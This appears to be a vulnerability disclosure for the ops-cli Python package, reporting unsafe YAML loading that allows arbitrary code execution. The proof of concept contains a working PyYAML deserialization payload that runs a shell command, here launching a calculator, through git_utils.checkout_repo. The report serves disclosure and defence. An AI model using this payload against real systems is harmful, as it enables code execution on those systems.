# Description

`ops-cli` is a wrapper for Terraform, Ansible, Helmfile and SSH for cloud automation , which is vulnerable to `Arbitary Code Execution`.

# Vulnerability

Vulnerable to YAML deserialization attack caused by unsafe loading.

# Proof of Concept

### Installation
```bash
pip install ops-cli
```

### Run exploit.py
```
import os
#os.system('pip install --upgrade ops-cli')
from ops import git_utils
exploit = """!!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "__import__('os').system('xcalc')"
"""
open('pwn.yml','w+').write(exploit)
git_utils.checkout_repo('Anon-Artist','pwn.yml','Junk')
```
* `python3 exploit.py`

# Impact

Arbitary Code Execution
